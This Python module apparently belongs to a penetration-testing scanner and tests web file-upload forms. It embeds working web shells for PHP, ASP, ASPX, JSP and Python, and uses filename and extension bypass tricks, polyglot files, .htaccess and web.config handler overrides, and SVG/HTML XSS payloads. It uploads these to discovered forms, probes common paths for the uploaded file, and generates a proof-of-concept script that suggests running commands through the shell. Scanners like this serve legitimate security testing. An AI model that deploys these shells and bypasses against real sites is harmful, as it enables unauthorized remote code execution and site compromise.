"""
Active vulnerability scanner for File Upload vulnerabilities.
"""

import asyncio
import uuid
from typing import Dict, List, Optional, Set, Any
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import logging
import mimetypes

from pentest_scanner.utils.http_client import HTTPClient, ResponseWrapper
from pentest_scanner.utils.models import (
    Vulnerability, Severity, VulnerabilityCategory, CVSSScore,
    Evidence, ScanResult, HTTPRequest, HTTPResponse
)
from pentest_scanner.config.settings import (
    SEVERITY_CVSS_MAP
)

logger = logging.getLogger(__name__)


class FileUploadScanner:
    """File Upload vulnerability scanner."""
    
    def __init__(self, client: HTTPClient, config, scan_result: ScanResult):
        self.client = client
        self.config = config
        self.scan_result = scan_result
        self.tested_parameters: Set[str] = set()
        
        # Malicious file test cases
        self.test_files = [
            # PHP shells
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.php5", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.phtml", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            
            # ASP/ASPX shells
            ("shell.asp", "<%@ Language=VBScript %><%execute(request(\"cmd\"))%>", "application/x-asp"),
            ("shell.aspx", "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\", Request[\"cmd\"]);%>", "application/x-aspx"),
            
            # JSP shells
            ("shell.jsp", "<%@ page import=\"java.io.*\" %><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>", "application/x-jsp"),
            
            # Python shells
            ("shell.py", "import os; os.system(request.GET.get('cmd', ''))", "text/x-python"),
            
            # Double extensions
            ("shell.php.png", "<?php system($_GET['cmd']); ?>", "image/png"),
            ("shell.jpg.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            
            # Null byte injection (legacy)
            ("shell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("shell.php\\0.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            
            # Case bypass
            ("shell.PHp", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.pHp", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            
            # Polyglot files
            ("polyglot.php.jpg", "GIF89a<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("polyglot.php.png", "\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "image/png"),
            
            # .htaccess upload
            (".htaccess", "AddType application/x-httpd-php .jpg", "text/plain"),
            
            # web.config upload (IIS)
            ("web.config", "<?xml version=\"1.0\"?><configuration><system.webServer><handlers><add name=\"PHP\" path=\"*.jpg\" verb=\"*\" modules=\"FastCgiModule\" scriptProcessor=\"php-cgi.exe\" /></handlers></system.webServer></configuration>", "application/xml"),
            
            # SVG with XSS
            ("test.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"></svg>", "image/svg+xml"),
            
            # HTML file
            ("test.html", "<html><body><script>alert('XSS')</script></body></html>", "text/html"),
        ]
    
    async def run(self, endpoints: List) -> Dict[str, Any]:
        """Run File Upload scans on discovered endpoints."""
        results = {
            "vulnerabilities_found": 0,
            "upload_forms_tested": 0,
            "file_upload_findings": [],
        }
        
        for endpoint in endpoints:
            if hasattr(endpoint, 'url'):
                url = endpoint.url
            else:
                url = endpoint.get('url', '')
            
            if not url:
                continue
            
            # Look for file upload forms
            if hasattr(endpoint, 'forms') and endpoint.forms:
                for form in endpoint.forms:
                    if self._has_file_upload(form):
                        results["upload_forms_tested"] += 1
                        await self._test_file_upload(endpoint.url, form, results)
        
        return results
    
    def _has_file_upload(self, form: Dict) -> bool:
        """Check if form has file upload input."""
        inputs = form.get('inputs', [])
        for inp in inputs:
            if inp.get('type') == 'file':
                return True
            # Check enctype
        if form.get('enctype') == 'multipart/form-data':
            return True
        return False
    
    async def _test_file_upload(self, base_url: str, form: Dict, results: Dict):
        """Test file upload vulnerabilities."""
        action = form.get('action', '')
        method = form.get('method', 'POST').upper()
        inputs = form.get('inputs', [])
        
        if not action:
            action = base_url
        elif not action.startswith('http'):
            action = urljoin(base_url, action)
        
        # Find file input
        file_input = None
        for inp in inputs:
            if inp.get('type') == 'file':
                file_input = inp.get('name', 'file')
                break
        
        if not file_input:
            file_input = 'file'  # Default
        
        for filename, content, content_type in self.test_files[:15]:  # Limit tests
            vuln = await self._test_upload_file(action, method, file_input, filename, content, content_type, inputs)
            if vuln:
                results["vulnerabilities_found"] += 1
                results["file_upload_findings"].append(vuln.to_dict())
                # Don't break - test multiple bypasses
    
    async def _test_upload_file(self, action: str, method: str, file_input: str, filename: str, content: str, content_type: str, all_inputs: List) -> Optional[Vulnerability]:
        """Test uploading a specific file."""
        try:
            # Build multipart form data
            import aiohttp
            from aiohttp import FormData
            
            form_data = FormData()
            
            # Add file
            form_data.add_field(file_input, content, filename=filename, content_type=content_type)
            
            # Add other form fields
            for inp in all_inputs:
                name = inp.get('name', '')
                if name and name != file_input and inp.get('type') not in ['submit', 'button', 'image', 'file']:
                    form_data.add_field(name, inp.get('value', 'test'))
            
            # Submit
            if method == "POST":
                response = await self.client.post(action, data=form_data)
            else:
                # For GET, can't upload files easily
                return None
            
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            # Check for successful upload indicators
            upload_indicators = self._check_upload_success(body, filename, response.status)
            
            if upload_indicators:
                # Check if file is accessible
                accessible = await self._check_file_accessible(action, filename, body)
                
                severity = self._assess_upload_severity(filename, content, accessible, upload_indicators)
                
                vuln = Vulnerability(
                    id=f"FILE_UPLOAD_{uuid.uuid4().hex[:8].upper()}",
                    title=f"Unrestricted File Upload: {filename}",
                    description=f"File upload accepts dangerous file type: {filename}. The application does not properly validate file extensions, content types, or file content.",
                    category=VulnerabilityCategory.FILE_UPLOAD,
                    severity=severity,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP[severity.value]),
                    owasp_category="A01:2021 – Broken Access Control",
                    url=action,
                    parameter=file_input,
                    method=method,
                    poc=f"Upload {filename} with malicious content",
                    poc_code=self._generate_upload_poc(action, file_input, filename, content, content_type),
                    remediation="Implement strict file validation: validate extension, MIME type, and file content. Store uploads outside web root. Use random filenames. Scan uploaded files for malware. Implement Content-Security-Policy.",
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control",
                        "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
                        "https://portswigger.net/web-security/file-upload"
                    ],
                    tags=["active", "file_upload", "rce", "bypass"],
                    confirmed=accessible
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description=f"File upload successful: {filename}",
                    data={
                        "filename": filename,
                        "content_type": content_type,
                        "indicators": upload_indicators,
                        "accessible": accessible
                    }
                ))
                vuln.request = HTTPRequest(method=method, url=action, body=f"multipart/form-data with {filename}")
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=str(response.url)
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing file upload {filename}: {e}")
        
        return None
    
    def _check_upload_success(self, body: str, filename: str, status_code: int) -> List[str]:
        """Check response for indicators of successful upload."""
        indicators = []
        body_lower = body.lower()
        
        if status_code in [200, 201, 202]:
            indicators.append("success_status")
        
        if filename.lower() in body_lower:
            indicators.append("filename_in_response")
        
        if any(kw in body_lower for kw in [
            "upload successful", "file uploaded", "upload complete",
            "successfully uploaded", "file saved", "upload ok"
        ]):
            indicators.append("success_message")
        
        if any(kw in body_lower for kw in [
            "path", "url", "location", "download", "view", "preview"
        ]):
            indicators.append("file_reference")
        
        return indicators
    
    async def _check_file_accessible(self, action: str, filename: str, response_body: str) -> bool:
        """Check if uploaded file is accessible via web."""
        # Try to extract file URL from response
        import re
        
        # Look for URLs in response
        urls = re.findall(r'https?://[^\s"\'<>]+', response_body)
        for url in urls:
            if filename in url:
                try:
                    response = await self.client.get(url)
                    return response.status == 200
                except Exception:
                    pass
        
        # Try common upload paths
        parsed = urlparse(action)
        base = f"{parsed.scheme}://{parsed.netloc}"
        common_paths = [
            f"/uploads/{filename}",
            f"/upload/{filename}",
            f"/files/{filename}",
            f"/assets/{filename}",
            f"/media/{filename}",
            f"/images/{filename}",
            f"/tmp/{filename}",
            f"/{filename}",
        ]
        
        for path in common_paths:
            try:
                url = base + path
                response = await self.client.head(url)
                if response.status == 200:
                    return True
            except Exception:
                pass
        
        return False
    
    def _assess_upload_severity(self, filename: str, content: str, accessible: bool, indicators: List[str]) -> Severity:
        """Assess file upload severity."""
        # Critical: Executable scripts accessible
        if accessible and any(ext in filename.lower() for ext in ['.php', '.asp', '.aspx', '.jsp', '.py', '.pl', '.cgi']):
            if '<?php' in content or '<%' in content or 'system(' in content or 'exec(' in content:
                return Severity.CRITICAL
        
        # High: Executable scripts uploaded (may not be accessible)
        if any(ext in filename.lower() for ext in ['.php', '.asp', '.aspx', '.jsp', '.py', '.pl', '.cgi']):
            return Severity.HIGH
        
        # High: .htaccess or web.config (server config)
        if filename in ['.htaccess', 'web.config']:
            return Severity.HIGH
        
        # Medium: SVG with XSS, HTML
        if filename.endswith('.svg') or filename.endswith('.html'):
            if 'onload' in content or 'script' in content.lower():
                return Severity.MEDIUM
        
        # Medium: Polyglot files
        if 'polyglot' in filename:
            return Severity.MEDIUM
        
        # Low: Other bypasses
        return Severity.LOW
    
    def _generate_upload_poc(self, action: str, file_input: str, filename: str, content: str, content_type: str) -> str:
        """Generate proof of concept code for file upload."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Unrestricted File Upload
Target: {action}
Parameter: {file_input}
Filename: {filename}
\"\"\"

import requests

# Target URL
target_url = "{action}"
file_param = "{file_input}"

# Malicious file content
filename = "{filename}"
content = \"\"\"{content}\"\"\"
content_type = "{content_type}"

print(f"[+] Testing file upload to {{target_url}}")
print(f"[+] File: {{filename}}")
print(f"[+] Content-Type: {{content_type}}")

# Create file
files = {{file_param: (filename, content, content_type)}}

try:
    response = requests.post(target_url, files=files, timeout=30)
    print(f"    Status: {{response.status_code}}")
    print(f"    Length: {{len(response.text)}}")
    
    # Check for success
    if response.status_code in [200, 201]:
        print("[+] Upload appears successful!")
        print(f"[+] Response: {{response.text[:500]}}")
        
        # Try to find uploaded file URL
        import re
        urls = re.findall(r'https?://[^\\s"\'<>]+', response.text)
        for url in urls:
            if filename in url:
                print(f"[+] Potential file URL: {{url}}")
                # Test accessibility
                test_resp = requests.get(url)
                if test_resp.status_code == 200:
                    print(f"[!!!] FILE ACCESSIBLE - RCE POSSIBLE!")
                    if "<?php" in content or "<%" in content:
                        print(f"[!!!] Try: {{url}}?cmd=id")
                        
except Exception as e:
    print(f"    Error: {{e}}")

print(f"\\n[+] Manual test: Upload {{filename}} via form at {{target_url}}")
"""